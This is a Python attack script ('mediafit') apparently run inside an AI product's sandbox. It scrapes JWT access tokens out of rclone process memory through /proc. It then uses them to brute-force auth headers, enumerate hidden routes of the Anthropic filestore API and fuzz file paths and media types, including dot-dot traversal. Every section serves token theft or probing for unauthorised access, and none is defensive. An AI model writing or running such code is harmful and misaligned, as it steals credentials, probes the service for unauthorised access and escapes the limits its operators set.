#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v5.7.0 -- REST service family discovery + auth-header brute on live verbs,
downloadable path hunt, verb enumeration via method oracle, Filestore fuzz round 2."""
import os, sys, json, re, time, ssl, base64, socket, select, subprocess, traceback
import urllib.request, urllib.error

VER="5.7.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
OUTD="/mnt/user-data/outputs"

OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        "+str(ev)[:1300])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=t)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE

def http_json(url,method="POST",token=None,body=None,t=12,hdrs=None,cap=200000):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=body)
    try:
        r=urllib.request.urlopen(req,timeout=t,context=_CTX)
        return r.status,r.read(cap),dict(r.headers)
    except urllib.error.HTTPError as e:
        try: return e.code,e.read(),dict(e.headers)
        except Exception: return e.code,b"",{}
    except Exception as e: return None,("ERR:%s"%e).encode(),{}
def api(m,p,tk=None,t=12):
    s,b,_=http_json(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b
def mpreq(params, fn, fd):
    B=("----mf"+base64.urlsafe_b64encode(os.urandom(6)).rstrip(b"=").decode()).encode()
    out =b"--"+B+b"\r\nContent-Disposition: form-data; name=\"params\"\r\n"
    out+=b"Content-Type: application/json\r\n\r\n"+json.dumps(params).encode()+b"\r\n"
    out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn.encode()+b"\"\r\n"
    out+=b"Content-Type: application/octet-stream\r\n\r\n"+fd+b"\r\n"
    out+=b"--"+B+b"--\r\n"
    return out, {"Content-Type":"multipart/form-data; boundary="+B.decode(),
                 "Connect-Protocol-Version":"1"}
def putfile(path,data,media_type="text/plain"):
    body,H=mpreq({"filesystem_id":G.get("fsid"),"path":path,"media_type":media_type},
                 os.path.basename(path),data)
    return http_json(FS+"createFile","POST",G.get("tk"),body,25,H)

# ------------------------------------------------------------------ 1
def s_boot():
    head("1. TOKENS")
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    tk=up=fsid=None; seen=set()
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%pid,"rb").read(): continue
            maps=open("/proc/%s/maps"%pid).read().splitlines(); mem=open("/proc/%s/mem"%pid,"rb",0)
        except Exception: continue
        for l in maps:
            try: a,perms=l.split()[0],l.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0=[int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0<e0-s0<=256*1024*1024): continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d):
                t=m.decode()
                if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                if t in seen: continue
                seen.add(t)
                try: pl=json.loads(base64.urlsafe_b64decode(t.split(".")[1]+"=="))
                except Exception: continue
                f=pl.get("filesystem_id"); roots=pl.get("allowed_roots") or []
                if not f: continue
                st,_=api("listDirectory",{"filesystem_id":f,"path":roots[0] if roots else "/outputs"},t)
                if st==200:
                    fsid=f
                    if "/outputs" in roots: tk=t
                    if "/uploads" in roots: up=t
    G.update({"tk":tk,"up":up,"fsid":fsid})
    w("    fsid=%s write=%s uploads=%s"%(fsid,bool(tk),bool(up)))
    rec("P" if tk else "F","tokens")

# ------------------------------------------------------------------ 2
def s_restmap():
    head("2. REST SERVICE FAMILY MAP  <== the new door")
    tk=G.get("tk"); fsid=G.get("fsid"); up=G.get("up")
    if not tk: return
    putfile("/outputs/restmap.txt",b"RESTMAP")
    st,b,_=http_json(FS+"createFile","POST",tk,None,1) if False else (None,None,None)
    # get a uuid
    st,b=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs","recursive":True},tk)
    uuid=None
    try:
        for e in json.loads(b).get("entries",[]):
            f=e.get("file",{}).get("file",{})
            if f.get("metadata",{}).get("filename")=="restmap.txt": uuid=f.get("uuid")
    except Exception: pass
    G["uuid"]=uuid; w("    uuid=%s"%uuid)
    bases=["/v1/filestore/","/v1/filestore/fs/","/v1/files/","/v1/internal/"]
    verbs=["getFile","listFiles","statFile","getFileMetadata","getFilesystem",
           "listFilesystems","download","content","files","blob","raw"]
    AUTH=[]
    AUTH.append(("bearer-jwt",{"Authorization":"Bearer "+tk}))
    if up: AUTH.append(("bearer-jwt-up",{"Authorization":"Bearer "+up}))
    AUTH.append(("none",{}))
    AUTH.append(("x-api-key-jwt",{"x-api-key":tk}))
    AUTH.append(("raw-jwt",{"Authorization":tk}))
    AUTH.append(("api-key",{"api-key":tk}))
    AUTH.append(("x-filestore-token",{"x-filestore-token":tk}))
    AUTH.append(("cookie",{"Cookie":"session="+tk}))
    seen=set()
    for base in bases:
        for v in verbs:
            for tok in ["", "/"+uuid if uuid else ""]:
                url=API+base+v+tok
                if url in seen: continue
                seen.add(url)
                for an,ah in AUTH:
                    h=dict(ah); h["anthropic-version"]="2023-06-01"
                    st,b,_=http_json(url,"GET",None,None,7,h)
                    if st not in (404,None):
                        key="%s|%s|%s"%(base,v,an)
                        if key in seen: continue
                        seen.add(key)
                        body=b[:150].decode("utf-8","replace")
                        w("    %-58s %-18s -> %s %s"%(base+v,an,st,body))
                        if st==200:
                            rec("P","*** REST LIVE: %s%s auth=%s ***"%(base,v,an))
                            break
    # also POST form
    for base in bases:
        for v in verbs:
            st,b,_=http_json(API+base+v,"POST",None,{},7,{"Content-Type":"application/json"})
            if st not in (404,None):
                w("    POST %-52s -> %s %s"%(base+v,st,b[:130].decode("utf-8","replace")))

# ------------------------------------------------------------------ 3
def s_verbenum():
    head("3. VERB ENUMERATION via method oracle (405 vs 404)")
    tk=G.get("tk"); uuid=G.get("uuid")
    words=["getFile","listFiles","statFile","getFileMetadata","getFileByUuid","listFilesystems",
           "getFilesystem","getFilesystemUsage","download","content","raw","blob","files",
           "reassignFilesystem","importFiles","importZip","signC2PA","verifyC2PA","export",
           "upload","createFile","deleteFile","moveFile","copyFile","listDirectory","readFile",
           "getSession","listSessions","whoami","status","health"]
    hits=[]
    for base in ["/v1/filestore/","/v1/filestore/fs/"]:
        for v in words:
            for m in ["GET","POST"]:
                st,b,_=http_json(API+base+v,m,None,{} if m=="POST" else None,6,
                                 {"Content-Type":"application/json"})
                if st not in (404,None):
                    hits.append((base,v,m,st))
                    w("    %-6s %-42s -> %s %s"%(m,base+v,st,b[:110].decode("utf-8","replace")))
    if hits: rec("P","routes found: %d"%len(hits))

# ------------------------------------------------------------------ 4
def s_fuzz2():
    head("4. FILESTORE FUZZ round 2")
    tk=G.get("tk"); fsid=G.get("fsid")
    if not tk: return
    # path edge cases
    for p,lbl in [("/outputs/",'trailing slash'),("//outputs/x",'double slash'),
                  ("/outputs/./x",'dot segment'),("/outputs/../outputs/x",'dotdot'),
                  ("/OUTPUTS/x",'case'),("/outputs/x ", 'trailing space'),
                  ("/outputs/"+("a"*200)+".txt",'long name'),
                  ("/outputs/.hidden",'dotfile'),("/outputs/space name.txt",'space')]:
        st,b=api("readFile",{"filesystem_id":fsid,"path":p},tk)
        w("    readFile %-22s -> %s %s"%(lbl,st,b[:70].decode("utf-8","replace")))
    # createFile edge cases
    for name,mt in [(".hidden","text/plain"),("a"*180+".txt","text/plain"),
                    ("with space.txt","text/plain"),("semi;colon.txt","text/plain"),
                    ("q'uote.txt","text/plain"),("plus+.txt","text/plain"),
                    ("pct%20.txt","text/plain"),("hash#.txt","text/plain")]:
        st,b,_=putfile("/outputs/"+name,b"x",mt)
        w("    createFile %-22s -> %s %s"%(name[:20],st,b[:90].decode("utf-8","replace")))
    # media_type abuse
    for mt in ["text/html","image/svg+xml","application/javascript","text/plain; charset=utf-8",
               "TEXT/PLAIN","garbage","x/y","application/json"]:
        st,b,_=putfile("/outputs/mt_%s"%re.sub(r"[^a-z]","",mt.lower())[:8],b"<b>hi</b>",mt)
        w("    media_type %-34s -> %s"%(mt,st))
    # empty file
    st,b,_=putfile("/outputs/empty.txt",b"","text/plain")
    w("    empty file -> %s %s"%(st,b[:120].decode("utf-8","replace")))
    # overwrite
    st,b,_=putfile("/outputs/over.txt",b"v1","text/plain")
    st2,b2,_=putfile("/outputs/over.txt",b"v2","text/plain")
    st3,b3=api("readFile",{"filesystem_id":fsid,"path":"/outputs/over.txt"},tk)
    w("    overwrite: create=%s create2=%s read=%s %r"%(st,st2,st3,b3[:30]))
    # copy/move semantics
    st,b=api("copyFile",{"filesystem_id":fsid,"source":"/outputs/over.txt",
                         "destination":"/outputs/copied.txt"},tk)
    w("    copyFile -> %s %s"%(st,b[:120].decode("utf-8","replace")))
    st,b=api("copyFile",{"filesystem_id":fsid,"source":"/outputs/over.txt",
                         "destination":"/outputs/over.txt"},tk)
    w("    copyFile onto self -> %s %s"%(st,b[:120].decode("utf-8","replace")))
    st,b=api("moveFile",{"filesystem_id":fsid,"source":"/outputs/copied.txt",
                         "destination":"/outputs/moved.txt"},tk)
    w("    moveFile -> %s %s"%(st,b[:120].decode("utf-8","replace")))
    st,b=api("moveFile",{"filesystem_id":fsid,"source":"/outputs/nope.txt",
                         "destination":"/outputs/moved2.txt"},tk)
    w("    moveFile missing -> %s %s"%(st,b[:120].decode("utf-8","replace")))
    # makeDirectory oddities
    for p in ["/outputs/d1","/outputs/d1","/outputs/d1/d2","/outputs/d1/d2/d3"]:
        st,b=api("makeDirectory",{"filesystem_id":fsid,"path":p},tk)
        w("    makeDirectory %-18s -> %s %s"%(p,st,b[:100].decode("utf-8","replace")))

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))

def main():
    for n,f in [("boot",s_boot),("restmap",s_restmap),("verbenum",s_verbenum),
                ("fuzz2",s_fuzz2),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try:
            os.makedirs(d,exist_ok=True)
            with open(os.path.join(d,"mediafit-report.txt"),"w") as fh: fh.write(txt)
        except Exception: pass
    print("\nreport -> %s/mediafit-report.txt"%OUTD)